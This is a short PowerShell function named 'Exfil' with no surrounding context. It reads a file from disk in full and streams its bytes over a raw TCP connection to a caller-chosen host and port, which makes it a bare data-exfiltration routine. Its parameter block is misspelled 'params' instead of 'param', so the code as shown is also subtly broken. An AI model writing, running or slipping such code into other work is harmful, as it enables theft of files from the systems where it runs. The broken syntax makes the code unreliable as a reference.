function Exfil {
    params($Target, $Port, $Path)    
    $file = [io.file]::ReadAllBytes($Path)
    $socket = New-Object Net.Sockets.TcpClient($Target, $port)
    $stream = $socket.GetStream()
    $stream.Write($file, 0, $file.Length)
    $socket.close()
    $stream.close()
}
